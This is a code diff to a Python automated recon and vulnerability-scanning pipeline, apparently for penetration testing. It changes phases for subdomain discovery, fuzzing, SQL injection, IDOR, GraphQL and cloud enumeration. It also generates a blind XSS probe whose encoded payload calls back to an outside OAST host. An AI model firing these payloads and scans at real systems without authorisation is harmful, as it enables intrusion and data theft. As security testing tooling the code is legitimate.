@@ -75,6 +75,7 @@ import base64
 import contextlib
 import hashlib
 import inspect
+import fnmatch
 import json
 import os
 import re
@@ -195,9 +196,10 @@ VALID_PHASES = {
     "42-LDAP",
     "43-DESERIAL",
     "44-CHAIN",
+    "44-REPORT",
     "45-EVIDENCE",
 }
-FAST_PHASES = {"00-SCOPE", "01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST", "44-CHAIN", "45-EVIDENCE"}
+FAST_PHASES = {"00-SCOPE", "01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST"}
 PhaseSet = Set[str]
 
 
@@ -238,11 +240,8 @@ def _parse_httpx_tech(src: Path, dst: Path) -> int:
         line = line.strip()
         if not line:
             continue
-        parts = line.split()
-        if len(parts) < 4:
-            continue
-        url = parts[0]
-        brackets = [p for p in parts if p.startswith("[") and p.endswith("]")]
+        url = line.split()[0]
+        brackets = re.findall(r"\[.*?\]", line)
         if len(brackets) >= 3:
             status = brackets[0]
             title = brackets[1]
@@ -287,9 +286,8 @@ LVL = {"info": C["c"], "ok": C["g"], "warn": C["y"], "err": C["red"], "skip": C[
 
 
 def disable_color() -> None:
-    for key in C:
-        C[key] = ""
-    global LVL
+    global LVL, C
+    C = {k: "" for k in C}
     LVL = {k: "" for k in LVL}
 
 
@@ -366,10 +364,11 @@ class PipelineConfig:
     sqlmap_risk: int = 1
     delay: float = 0.0
     rate_limit: int = 0
-    sample_urls_fuzz: int = 5
+    sample_urls_fuzz: int = 2
     sample_urls_params: int = 15
 
-    sample_hosts_ssl: int = 10
+    sample_urls_arjun_waf: int = 5
+    sample_hosts_ssl: int = 3
     sample_hosts_origin: int = 10
     sample_endpoints_l: int = 20
     sample_urls_xss_blind: int = 20
@@ -468,8 +467,8 @@ def _extra_http_args() -> List[str]:
     args: List[str] = []
     cookie = os.environ.get("COOKIE", "")
     if cookie:
-        # Strip \r to prevent header injection from CRLF in cookie value
-        args += ["-H", f"Cookie: {cookie.replace(chr(13), '').replace(chr(10), '; ')}"]
+        # Strip \r\n to prevent header injection in cookie value
+        args += ["-H", f"Cookie: {cookie.replace(chr(13), '').replace(chr(10), ' ')}"]
     headers_raw = os.environ.get("EXTRA_HEADERS", "")
     if headers_raw:
         for h in headers_raw.replace(chr(13), "").split("\n"):
@@ -493,6 +492,26 @@ def _get_urlopener() -> Callable[..., Any]:
     return urllib.request.urlopen
 
 
+class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
+    """HTTPRedirectHandler that does NOT follow redirects (returns 3xx directly)."""
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def _get_no_redirect_urlopener() -> Callable[..., Any]:
+    """Return a urlopen-compatible callable that does NOT follow HTTP redirects."""
+    proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
+    if proxy:
+        handler = urllib.request.ProxyHandler({
+            "http": proxy,
+            "https": proxy,
+        })
+        opener = urllib.request.build_opener(_NoRedirectHandler, handler)
+        return opener.open
+    opener = urllib.request.build_opener(_NoRedirectHandler)
+    return opener.open
+
+
 async def _async_urlopen(urlopen_func: Any, req: urllib.request.Request, timeout: int = 10) -> Tuple[int, Any, bytes]:
     """Run urlopen in a thread pool to avoid blocking the event loop.
     Returns (status_code, headers, body_bytes).
@@ -501,6 +520,13 @@ async def _async_urlopen(urlopen_func: Any, req: urllib.request.Request, timeout
         with urlopen_func(req, timeout=timeout) as resp:
             return (resp.status, resp.headers, resp.read())
     return await asyncio.wait_for(asyncio.to_thread(_fetch), timeout=timeout + 5)
+
+
+async def _async_urlopen_no_redirect(urlopen_func: Any, req: urllib.request.Request, timeout: int = 10) -> Tuple[int, Any, bytes]:
+    """Like _async_urlopen but does NOT follow HTTP 3xx redirects.
+    Returns (status_code, headers, body_bytes) from the initial response."""
+    _no_redirect_urlopen = _get_no_redirect_urlopener()
+    return await _async_urlopen(_no_redirect_urlopen, req, timeout=timeout)
 
 
 async def _throttle() -> None:
@@ -756,7 +782,7 @@ def ensure(p: Path) -> Path:
 def _existing_artifacts(d: Dict[str, str]) -> Dict[str, str]:
     """Filter a phase-result dict to only keys whose file paths exist on disk.
     Prevents non-existent artifact paths from polluting state.json."""
-    return {k: v for k, v in d.items() if v.endswith(".txt") and Path(v).exists()}
+    return {k: v for k, v in d.items() if Path(v).exists()}
 
 
 def read_lines(p: Path) -> List[str]:
@@ -869,7 +895,7 @@ def safe_suffix(s: str) -> str:
     return hashlib.sha1(s.encode("utf-8", errors="ignore")).hexdigest()[:12]
 
 
-def _safe_name(s: str, maxlen: int = 32) -> str:
+def _safe_name(s: str, maxlen: int = 80) -> str:
     """Sanitize a string for use as a log filename (no special chars)."""
     safe = (
         s.replace("/", "_")
@@ -1169,7 +1195,7 @@ async def phase_01_RECON(
             "| sed 's/ (FQDN)$//' >> \"$OUT\" || true\n"
         )
         runner.chmod(0o755)
-        jobs.append(("amass", ["bash", str(runner)], _maybe_timeout(1800)))
+        jobs.append(("amass", ["bash", str(runner)], _maybe_timeout(600)))
 
     if not jobs:
         log("warn", "01-RECON: no subdomain tools available")
@@ -1335,11 +1361,11 @@ async def phase_03_PERMUTE(
 ) -> Dict[str, Any]:
     if skip & {"03-PERMUTE"}:
         return {}
-    _a3_stamp = outdir / ".phase_03.stamp"
-    if _a3_stamp.exists() and not force:
+    _a3_stamp = outdir / f".phase_03.stamp.{os.getpid()}"
+    if not force and any(outdir.glob(".phase_03.stamp.*")):
         _a3_out = outdir / "all_subs.txt"
         return {"01-RECON": str(_a3_out), "03-PERMUTE": str(_a3_out), "count": count_nonblank(_a3_out)}
-    log("info", "Phase 03-PERMUTE: subdomain permutation (dnsgen → dnsx)")
+    log("info", "Phase 03-PERMUTE: subdomain permutation (alterx → dnsgen → dnsx)")
     # Input: all discovered subdomains from 01-RECON (stable after Stage 0)
     subs_in = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
     if not subs_in.exists() or not read_lines(subs_in):
@@ -1349,7 +1375,20 @@ async def phase_03_PERMUTE(
     resolved = outdir / "subs_permuted_resolved.txt"
     merged = outdir / "subs_merged.txt"
     all_subs = outdir / "all_subs.txt"
+    alt_out = outdir / "subs_permuted_alterx.txt"
     jobs: List[Tuple[str, List[str], int]] = []
+    if t.has("alterx"):
+        runner = outdir / "logs" / "alterx_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"IN={shlex.quote(str(subs_in))}\n"
+            f"OUT={shlex.quote(str(alt_out))}\n"
+            "alterx -l \"$IN\" -silent -o \"$OUT\" 2>/dev/null || true\n"
+        )
+        runner.chmod(0o755)
+        jobs.append(("alterx", ["bash", str(runner)], 600))
     if t.has("dnsgen"):
         runner = outdir / "logs" / "dnsgen_runner.sh"
         ensure(runner)
@@ -1362,7 +1401,11 @@ async def phase_03_PERMUTE(
         )
         runner.chmod(0o755)
         jobs.append(("dnsgen", ["bash", str(runner)], 600))
+    if jobs:
         await run_parallel(jobs, outdir)
+    # Merge alterx results into subs_in so dnsx can also resolve them
+    if alt_out.exists() and read_lines(alt_out):
+        merge_unique([subs_in, alt_out], subs_in)
     # Resolve permuted subdomains with dnsx
     if permuted.exists() and read_lines(permuted) and t.has("dnsx"):
         resolved_job = (
@@ -1602,7 +1645,7 @@ async def phase_04_SCAN(
         _write_target_tokens(raw_hosts, targets)
         _parse_httpx_tech(raw_hosts, outdir / "tech.txt")
     elif have_hosts:
-        merge_unique([hosts], targets)
+        _write_target_tokens(hosts, targets)
     return _existing_artifacts({
         "04-SCAN.ports": str(ports_file),
         "04-SCAN.hosts": str(raw_hosts),
@@ -1630,7 +1673,14 @@ async def phase_04b_TAKEOVER_VALIDATE(
     candidates: List[str] = []
     for src in takeover_sources:
         if src.exists():
-            candidates.extend(read_lines(src))
+            for ln in read_lines(src):
+                ln = ln.strip()
+                if not ln:
+                    continue
+                # Strip extra metadata nuclei may append:  URL [type] [cname]
+                url = ln.split()[0] if ln.split() else ln
+                if url and (url.startswith("http://") or url.startswith("https://") or "." in url):
+                    candidates.append(url)
     candidates = _dedupe_by_host_path(candidates)
     if not candidates:
         log("warn", "04b-TAKEOVER-VALIDATE: no takeover candidates found; skipping")
@@ -1685,28 +1735,27 @@ async def phase_05_HARVEST(
 
     async def _c1_resolve_hosts() -> Optional[Path]:
         h = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
-        if not h.exists() or not read_lines(h):
+        h_ok = h.exists() and bool(read_lines(h))
+        if not h_ok:
             h = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
-        if h.exists() and read_lines(h) and h.name == "hosts.txt":
+            h_ok = h.exists() and bool(read_lines(h))
+        if h_ok and h.name == "hosts.txt":
             normalized = outdir / "host_targets.txt"
-            _write_target_tokens(h, normalized)
+            # Only normalize if destination doesn't exist yet (04-SCAN already
+            # produced host_targets.txt from the same hosts.txt in its phase).
+            if not normalized.exists():
+                _write_target_tokens(h, normalized)
             h = normalized
-        if not h.exists() or not read_lines(h):
+        if not h.exists() or not bool(read_lines(h)):
             h = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
-        if h.exists() and read_lines(h):
+        if h.exists() and bool(read_lines(h)):
             return h
         return None
 
     hosts = await _c1_resolve_hosts()
     if hosts is None:
-        for _ in range(240):
-            await asyncio.sleep(5)
-            hosts = await _c1_resolve_hosts()
-            if hosts is not None:
-                break
-        if hosts is None:
-            log("warn", "05-HARVEST: no host input; skipping")
-            return {}
+        log("warn", "05-HARVEST: no host input; skipping")
+        return {}
     waf_detected = getattr(_PIPELINE_CFG, 'waf_detected', False)
     if waf_detected:
         log("info", "05-HARVEST: WAF detected, reducing crawler depth/concurrency")
@@ -1772,7 +1821,7 @@ async def phase_05_HARVEST(
                     "-d",
                     _katana_depth,
                     "-kf",
-                    "all",
+                    "url,path,technologies",
                     "-duc",
                 ] + _katana_proxy + _extra_http_args(),
                 _maybe_timeout(900) if waf_detected else _maybe_timeout(1800),
@@ -1944,7 +1993,7 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         keep: List[str] = []
         for u in read_lines(urls):
             path = u.split("?", 1)[0].split("#", 1)[0].lower()
-            if path.endswith((".js", ".jsx")):
+            if path.endswith((".js", ".jsx", ".mjs", ".cjs")):
                 keep.append(u)
         if keep:
             ensure(js_urls).write_text("\n".join(keep) + "\n")
@@ -1965,9 +2014,10 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
             'secretfinder -i "$IN" 2>/dev/null > "$OUT" || true\n'
         )
         runner.chmod(0o755)
-        jobs.append(("secretfinder", ["bash", str(runner)], 3000))
+        jobs.append(("secretfinder", ["bash", str(runner)], 1200))
     if t.has("linkfinder"):
-        linkfinder_out = outdir / "urls_linkfinder.txt"
+        # linkfinder -o produces HTML output; kept for manual inspection only.
+        linkfinder_out = outdir / "urls_linkfinder.html"
         runner = outdir / "logs" / "linkfinder_runner.sh"
         ensure(runner)
         runner.write_text(
@@ -1979,6 +2029,19 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         )
         runner.chmod(0o755)
         jobs.append(("linkfinder", ["bash", str(runner)], 1200))
+    if t.has("xnlinkfinder") or t.has("xnLinkFinder"):
+        xnlink_out = outdir / "urls_xnlinkfinder.txt"
+        runner = outdir / "logs" / "xnlinkfinder_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"IN={shlex.quote(str(js_urls))}\n"
+            f"OUT={shlex.quote(str(xnlink_out))}\n"
+            'xnLinkFinder -i "$IN" -o "$OUT" -sp /tmp/xnlinkfinder 2>/dev/null || true\n'
+        )
+        runner.chmod(0o755)
+        jobs.append(("xnLinkFinder", ["bash", str(runner)], 1200))
     if t.has("nuclei"):
         jobs.append(
             (
@@ -2016,12 +2079,19 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
             [outdir / "urls_all.txt", json_urls],
             outdir / "urls_all.txt",
         )
+    xnlink_out = outdir / "urls_xnlinkfinder.txt"
+    if xnlink_out.exists() and read_lines(xnlink_out):
+        merge_unique(
+            [outdir / "urls_all.txt", xnlink_out],
+            outdir / "urls_all.txt",
+        )
     n = merge_unique(
         [outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
         outdir / "js_secrets.txt",
     )
     if n == 0:
         log("warn", "06-JSINTEL: no JS findings produced")
+        ensure(outdir / "js_secrets.txt").write_text("")
     return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": n}
 
 
@@ -2034,6 +2104,11 @@ async def phase_07_PARAMS(
     if _d_out.exists() and not force:
         return {"07-PARAMS": str(_d_out), "count": count_nonblank(_d_out)}
     log("info", "Phase 07-PARAMS: parameter discovery")
+    # Clean up stale normalized output from prior runs so it doesn't
+    # leak into the fresh merge on forced re-runs when arjun fails.
+    for old in outdir.glob("params_*.txt"):
+        if old.name != "params.txt":
+            old.unlink(missing_ok=True)
     urls = outdir / "urls_all.txt"
     if not urls.exists() or not read_lines(urls):
         log("warn", "07-PARAMS: no URLs; skipping")
@@ -2042,12 +2117,14 @@ async def phase_07_PARAMS(
     jobs: List[Tuple[str, List[str], int]] = []
     # arjun writes JSON. We capture the JSON and normalize to one URL per
     # line in the .txt sibling below. Over Tor this is very slow — sample URLs.
+    arjun_had_input = False
     if t.has("arjun"):
         arjun_in = ensure(outdir / "urls_arjun_sample.txt")
         waf_detected = _PIPELINE_CFG.waf_detected
-        sample_size = min(_PIPELINE_CFG.sample_urls_params, 5) if waf_detected else _PIPELINE_CFG.sample_urls_params
+        sample_size = min(_PIPELINE_CFG.sample_urls_params, _PIPELINE_CFG.sample_urls_arjun_waf) if waf_detected else _PIPELINE_CFG.sample_urls_params
         arjun_urls = _d_urls[:sample_size]
         if arjun_urls:
+            arjun_had_input = True
             arjun_in.write_text("\n".join(arjun_urls) + "\n")
             runner = outdir / "logs" / "arjun_runner.sh"
             ensure(runner)
@@ -2065,9 +2142,8 @@ async def phase_07_PARAMS(
                 log("info", f"07-PARAMS: WAF detected, reduced arjun sample to {sample_size} URLs with {timeout}s timeout")
     await run_parallel(jobs, outdir)
     # Normalize arjun JSON output to plain URL-per-line text.
-    for raw in (outdir / "params_arjun.json",):
-        if not raw.exists():
-            continue
+    raw = outdir / "params_arjun.json"
+    if raw.exists():
         norm = raw.with_suffix(".txt")
         urls_found: List[str] = []
         data = None
@@ -2090,9 +2166,12 @@ async def phase_07_PARAMS(
             for rec in read_jsonl(raw):
                 if isinstance(rec, dict) and rec.get("url"):
                     urls_found.append(str(rec["url"]))
-        if not urls_found and _PIPELINE_CFG.waf_detected:
-            log("warn", "07-PARAMS: arjun produced no results — likely blocked by WAF")
+        if not urls_found:
+            reason = "likely blocked by WAF" if _PIPELINE_CFG.waf_detected else "arjun produced no results"
+            log("warn", f"07-PARAMS: {reason}")
         ensure(norm).write_text("\n".join(urls_found) + ("\n" if urls_found else ""))
+    elif arjun_had_input:
+        log("warn", "07-PARAMS: arjun produced no output file")
     # Glob params_*.txt but EXCLUDE the params.txt we are about to write.
     parts = sorted(p for p in outdir.glob("params_*.txt") if p.name != "params.txt")
     n = merge_unique(parts, outdir / "params.txt")
@@ -2230,7 +2309,7 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
         if alt:
             wordlist = str(alt[0])
     if not wordlist or not Path(wordlist).exists():
-        log("warn", "08-FUZZ: no wordlist found, ffuf disabled")
+        log("warn", f"08-FUZZ: no wordlist found (searched {_seclists_base}), ffuf disabled")
         wordlist = ""
     if t.has("ffuf") and wordlist:
         for u in sample:
@@ -2280,24 +2359,8 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
                     )
                 )
 
-    if t.has("feroxbuster"):
-        _fb_proxy = []
-        if _PIPELINE_CFG.proxy:
-            _fb_proxy = ["--proxy", _PIPELINE_CFG.proxy]
-        for u in sample:
-            out_txt = outdir / f"fb_{safe_suffix(u)}.txt"
-            jobs.append(
-                (
-                    f"feroxbuster-{_safe_name(u)}",
-                    ["feroxbuster", "-q", "-u", u, "--no-state", "-o", str(out_txt)]
-                    + _fb_proxy + _extra_http_args(),
-                    3600,
-                )
-            )
     # Clean up stale normalized .txt files from prior runs first
     for old in outdir.glob("ffuf_*.txt"):
-        old.unlink(missing_ok=True)
-    for old in outdir.glob("fb_*.txt"):
         old.unlink(missing_ok=True)
     await run_parallel(jobs, outdir)
     normalized: List[Path] = []
@@ -2305,10 +2368,7 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
         norm = ffp.with_suffix(".txt")
         ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
         normalized.append(norm)
-    normalized.extend(outdir.glob("fb_*.txt"))
     n = merge_unique(normalized, outdir / "fuzz.txt")
-    for p in normalized:
-        p.unlink(missing_ok=True)
     for p in outdir.glob("ffuf_*.json"):
         p.unlink(missing_ok=True)
     if n == 0:
@@ -2551,6 +2611,14 @@ async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet
                     1800,
                 )
             )
+    # Clean up stale per-host files from prior runs BEFORE launching new jobs
+    # to prevent old artifacts from being re-incorporated into the merge.
+    for p in outdir.glob("testssl_*.txt"):
+        p.unlink(missing_ok=True)
+    for p in outdir.glob("testssl_py_*.txt"):
+        p.unlink(missing_ok=True)
+    for p in outdir.glob("wpscan_*.txt"):
+        p.unlink(missing_ok=True)
     # run both groups in parallel; per-host files remove the race
     await run_parallel(testssl_jobs + wpscan_jobs, outdir)
     n = merge_unique(
@@ -2564,12 +2632,6 @@ async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet
         if len(clean) != n:
             tls_wp.write_text("\n".join(clean) + "\n")
             n = len(clean)
-    for p in outdir.glob("testssl_*.txt"):
-        p.unlink(missing_ok=True)
-    for p in outdir.glob("testssl_py_*.txt"):
-        p.unlink(missing_ok=True)
-    for p in outdir.glob("wpscan_*.txt"):
-        p.unlink(missing_ok=True)
     tls_script.unlink(missing_ok=True)
     return {"10-TLSCMS": str(tls_wp), "count": n}
 
@@ -2622,10 +2684,10 @@ async def phase_11_INJECT(
         dalfox_cmd = [
             "dalfox", "file", str(dalfox_in), "-S",
             "--output", str(outdir / "xss.txt"),
-            "--delay", "2000",
+            "--delay", "500",
+            "--no-spinner",
             "--user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "--only-custompayload",
-            "--waf-evasion",
         ]
         proxy = os.environ.get("PROXY", "")
         if proxy:
@@ -2727,6 +2789,7 @@ async def phase_11_INJECT(
         if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
             blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
             blind_script = outdir / "blind_xss_probe.py"
+            _xss_b64 = base64.b64encode(f"fetch('http://{oast_domain}/blind=xss')".encode()).decode()
             blind_script.write_text(
                 "#!/usr/bin/env python3\n"
                 '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
@@ -2740,7 +2803,7 @@ async def phase_11_INJECT(
                 "    _urlopen = urllib.request.urlopen\n"
                 f"OAST = {json.dumps(oast_domain)}\n"
                 f"IN = {json.dumps(str(blind_xss_in))}\n"
-                'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("ZmV0Y2goImh0dHA6Ly97b2FzdH0vYmxpbmQ9eHNzIik=".replace("{{oast}}",OAST)))>\'\n'
+                f'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("{_xss_b64}"))>\'\n'
                 "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                 "with open(IN) as f:\n"
                 "    for line in f:\n"
@@ -2898,8 +2961,8 @@ async def phase_11b_SQLMAP(
                         candidates.append(test_url)
                         findings.append(f"[candidate] {test_url} → status={test_status} len={test_len} (baseline={base_status}/{base_len})")
                         break
-                if url in candidates:
-                    break
+                    if test_url in candidates:
+                        break
         except Exception:
             continue
     if not candidates:
@@ -2908,7 +2971,7 @@ async def phase_11b_SQLMAP(
     # Now run sqlmap on the filtered candidates
     if t.has("sqlmap"):
         sqlmap_in = ensure(outdir / "sqlmap_candidates.txt")
-        sqlmap_in.write_text("\n".join(candidates) + "\n")
+        sqlmap_in.write_text("\n".join(sorted(set(candidates))) + "\n")
         sqlmap_dir = outdir / "sqlmap_11b_output"
         runner = outdir / "logs" / "sqlmap_11b_runner.sh"
         _sql_extra = ""
@@ -2964,7 +3027,8 @@ async def phase_12_SSTI(
     all_urls = _dedupe_by_host_params(all_urls)
     param_urls = [u for u in all_urls if "=" in u]
     if not param_urls:
-        param_urls = all_urls[:_PIPELINE_CFG.sample_urls_ssti]
+        log("warn", "12-SSTI: no param-bearing URLs; skipping")
+        return {"12-SSTI": str(outdir / "ssti.txt"), "count": 0}
 
     eval_map = {
         "{{7*7}}": "49",
@@ -3074,7 +3138,6 @@ async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, o
         return {}
     _h_out = outdir / "oast" / "callbacks.txt"
     if _h_out.exists() and not force:
-        oast.stop()
         return {"13-OOB": str(_h_out), "count": count_nonblank(_h_out)}
     log("info", "Phase 13-OOB: OAST callback collection")
     out = oast.stop()
@@ -3275,14 +3338,14 @@ async def phase_14_ORIGIN(
                     continue
         except Exception:
             pass
-    # 3c. SPF / DMARC / DKIM DNS record checks
+    # 3c. SPF / DMARC / DKIM DNS record checks (all use TXT records)
     if t.has("dig"):
-        for rec, label in (("txt", "SPF"), ("dmarc", "DMARC"), ("dkim", "DKIM")):
-            query = f"_dmarc.{domain}" if rec == "dmarc" else (
-                f"default._domainkey.{domain}" if rec == "dkim" else domain)
+        for rec, label in (("txt", "SPF"), ("txt", "DMARC"), ("txt", "DKIM")):
+            query = f"_dmarc.{domain}" if label == "DMARC" else (
+                f"default._domainkey.{domain}" if label == "DKIM" else domain)
             try:
                 sp_proc = await asyncio.create_subprocess_exec(
-                    "dig", "+short", _DNS_RESOLVER, rec, query,
+                    "dig", "+short", _DNS_RESOLVER, "txt", query,
                     stdin=asyncio.subprocess.DEVNULL,
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.DEVNULL,
@@ -3386,7 +3449,7 @@ _JS_SECRET_PATTERNS: List[Tuple[str, str]] = [
         r"(?i)(?:internal|private|staging|dev|jenkins|gitlab|jira|confluence)\.(?:com|local|internal|corp)",
     ),
 ]
-_SOURCE_MAP_RE = re.compile(r'(?://#\s*sourceMappingURL=|sourceMappingURL=)([^\s"\']+)')
+_SOURCE_MAP_RE = re.compile(r'(?://#\s*sourceMappingURL=|sourceMappingURL=)([^\s"\']+)', re.IGNORECASE)
 
 
 async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
@@ -3458,15 +3521,13 @@ async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
             if val in seen_secrets:
                 continue
             # Shannon entropy > 4.5 suggests random-looking secret
-            freq = [0.0] * 128
+            freq: Dict[str, int] = {}
             for c in val:
-                if ord(c) < 128:
-                    freq[ord(c)] += 1
+                freq[c] = freq.get(c, 0) + 1
             entropy = 0.0
-            for f in freq:
-                if f > 0:
-                    p = f / len(val)
-                    entropy -= p * math.log2(p) if p > 0 else 0.0
+            for f in freq.values():
+                p = f / len(val)
+                entropy -= p * math.log2(p)
             if entropy > 4.5:
                 seen_secrets.add(val)
                 findings.append(f"[high-entropy] {val[:60]}… (entropy={entropy:.2f})  ({js_url})")
@@ -3525,7 +3586,7 @@ async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
                 await run_parallel(truffle_jobs, outdir)
                 for tfp in sorted(outdir.glob("trufflehog_*.txt")):
                     if tfp.exists() and read_lines(tfp):
-                        for ln in read_lines(tfp)[:5]:
+                        for ln in read_lines(tfp):
                             findings.append(f"  [trufflehog] {ln}")
     if t.has("gitleaks"):
         if list(outdir.glob("js_raw_*.js")):
@@ -4007,6 +4068,8 @@ async def phase_17_IDOR(
             mutations.append("0")
             mutations.append("1")
             mutations.append("-1")
+            # Deduplicate to avoid sending the same mutation twice
+            mutations = list(dict.fromkeys(mutations))
             for mutation in mutations[:_PIPELINE_CFG.sample_endpoints_post]:
                 await _throttle_rate()
                 test_qs = qs.copy()
@@ -4179,6 +4242,27 @@ async def phase_18_CLOUD(
         )
         if cloud_out.exists():
             findings.append(f"[cloud_enum] results → {cloud_out}")
+    # CloudFox cloud enumeration
+    if t.has("cloudfox"):
+        cloudfox_outdir = outdir / "cloudfox_results"
+        cloudfox_outdir.mkdir(parents=True, exist_ok=True)
+        runner = outdir / "logs" / "cloudfox_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"DOMAIN={shlex.quote(domain)}\n"
+            f"OUT={shlex.quote(str(cloudfox_outdir))}\n"
+            '# Try common AWS profiles; silently skip if no credentials\n'
+            'for profile in default dev staging prod; do\n'
+            '  cloudfox aws -p "$profile" --output-dir "$OUT" 2>/dev/null || true\n'
+            'done\n'
+        )
+        runner.chmod(0o755)
+        await _run("cloudfox", ["bash", str(runner)], 600, outdir)
+        reports = list(cloudfox_outdir.glob("**/*.txt"))
+        if reports:
+            findings.append(f"[cloudfox] {len(reports)} report files → {cloudfox_outdir}")
     # Python-based bucket probing
     async def _probe_bucket(bucket: str) -> List[str]:
         results: List[str] = []
@@ -4250,7 +4334,8 @@ async def phase_19_GIT(
     if not targets:
         log("warn", "Phase 19-GIT: no HTTP targets; skipping")
         return {"19-GIT": str(_n_out), "count": 0}
-    # Check for exposed .git directories
+    # Check for exposed .git directories (use no-redirect to avoid false positives)
+    _no_redirect_urlopen = _get_no_redirect_urlopener()
     async def _check_git(url: str) -> List[str]:
         results: List[str] = []
         for git_path in _GIT_PATHS:
@@ -4258,7 +4343,7 @@ async def phase_19_GIT(
             try:
                 req = urllib.request.Request(test_url, method="HEAD",
                     headers={"User-Agent": "Mozilla/5.0"})
-                git_status, _, _ = await _async_urlopen(_n_urlopen, req, timeout=10)
+                git_status, _, _ = await _async_urlopen(_no_redirect_urlopen, req, timeout=10)
                 if git_status == 200:
                     results.append(f"[.git-exposed] {test_url} (HTTP {git_status})")
                     break
@@ -4370,7 +4455,58 @@ async def phase_20_GRAPHQL(
                     ["bash", str(runner)],
                     300, outdir,
                 )
-    # Custom introspection probes
+    # Clairvoyance GraphQL introspection abuse
+    if t.has("clairvoyance"):
+        clairvoyance_out = outdir / "clairvoyance_results"
+        clairvoyance_out.mkdir(parents=True, exist_ok=True)
+        for tgt in targets:
+            for ep in _GRAPHQL_ENDPOINTS:
+                url = f"{tgt}{ep}"
+                cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
+                runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
+                ensure(runner)
+                runner.write_text(
+                    "#!/usr/bin/env bash\n"
+                    "set -eu\n"
+                    f"URL={shlex.quote(url)}\n"
+                    f"OUT={shlex.quote(str(cv_out))}\n"
+                    'clairvoyance "$URL" -o "$OUT" 2>/dev/null || true\n'
+                )
+                runner.chmod(0o755)
+                await _run(
+                    f"clairvoyance-{_safe_name(url)}",
+                    ["bash", str(runner)],
+                    300, outdir,
+                )
+        cv_reports = list(clairvoyance_out.glob("*.json"))
+        if cv_reports:
+            findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")
+    # Graphinder GraphQL endpoint discovery
+    if t.has("graphinder"):
+        graphinder_out = outdir / "graphinder_results"
+        graphinder_out.mkdir(parents=True, exist_ok=True)
+        for tgt in targets:
+            runner = outdir / "logs" / f"graphinder_{_safe_name(tgt)}_runner.sh"
+            out_file = graphinder_out / f"{_safe_name(tgt)}.json"
+            ensure(runner)
+            runner.write_text(
+                "#!/usr/bin/env bash\n"
+                "set -eu\n"
+                f"TARGET={shlex.quote(tgt)}\n"
+                f"OUT={shlex.quote(str(out_file))}\n"
+                'graphinder -t "$TARGET" -o "$OUT" 2>/dev/null || true\n'
+            )
+            runner.chmod(0o755)
+            await _run(
+                f"graphinder-{_safe_name(tgt)}",
+                ["bash", str(runner)],
+                300, outdir,
+            )
+        gi_reports = list(graphinder_out.glob("*.json"))
+        if gi_reports:
+            findings.append(f"[graphinder] {len(gi_reports)} endpoint reports → {graphinder_out}")
+    # Custom introspection probes (no-redirect to avoid following redirects away from the endpoint)
+    _gql_no_redirect = _get_no_redirect_urlopener()
     async def _probe_graphql(url: str) -> List[str]:
         results: List[str] = []
         for ep in _GRAPHQL_ENDPOINTS:
@@ -4382,7 +4518,7 @@ async def phase_20_GRAPHQL(
                         "Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0",
                     })
-                _, _, gql_body_bytes = await _async_urlopen(_o_urlopen, req, timeout=15)
+                _, _, gql_body_bytes = await _async_urlopen(_gql_no_redirect, req, timeout=15)
                 body = gql_body_bytes.decode("utf-8", errors="ignore")
                 if '"data"' in body and '__schema' in body:
                     results.append(f"[introspection-enabled] {test_url}")
@@ -4534,9 +4670,6 @@ async def phase_21_WAF(
                 req = urllib.request.Request(probe_url, method="GET",
                     headers={"User-Agent": "Mozilla/5.0"})
                 awaf_status, _, awaf_body = await _async_urlopen(_p_urlopen, req, timeout=10)
-                if awaf_status in (403, 406, 429, 503, 501):
